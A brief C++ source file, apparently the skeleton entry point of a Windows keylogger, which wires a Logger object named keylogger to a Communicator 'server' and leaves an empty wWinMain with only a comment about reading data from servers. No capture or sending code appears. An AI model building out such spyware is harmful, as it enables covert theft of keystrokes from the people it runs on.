#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <string>
#include <fstream>
#include "Communicator.h"
#include "Logger.h"

// instances
Communicator server;
Logger keylogger(server);
	
/// <summary>
/// The main entry point of the entire program.
/// </summary>
int WINAPI wWinMain(
	HINSTANCE hInstance, 
	HINSTANCE hPrevInstance, 
	PWSTR pCmdLine, 
	int nCmdShow) {

	// read data from servers
}